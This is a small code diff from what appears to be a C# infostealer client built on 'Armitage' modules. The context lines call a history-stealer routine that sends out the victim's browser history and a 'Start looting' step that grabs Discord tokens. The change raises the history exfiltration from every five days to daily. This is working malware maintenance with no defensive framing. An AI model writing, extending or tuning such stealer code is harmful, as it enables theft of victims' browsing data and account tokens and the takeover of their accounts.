@@ -94,10 +94,12 @@ namespace Client
 
             Armitage.Watchers.Filesystem.Start();
 
-            if ((Constants.Today - Properties.Settings.Default.LastHistorySent).TotalDays > 5)
+            // send this once everyday
+            if ((Constants.Today - Properties.Settings.Default.LastHistorySent).TotalDays > 1)
             {
                 Armitage.Cookies.History_Stealer.SendOne(); // send history
             }
+
             /// Start looting.
             // Discord tokens
             var discord_tokens = Armitage.Cookies.Discord_Token.Stealu();
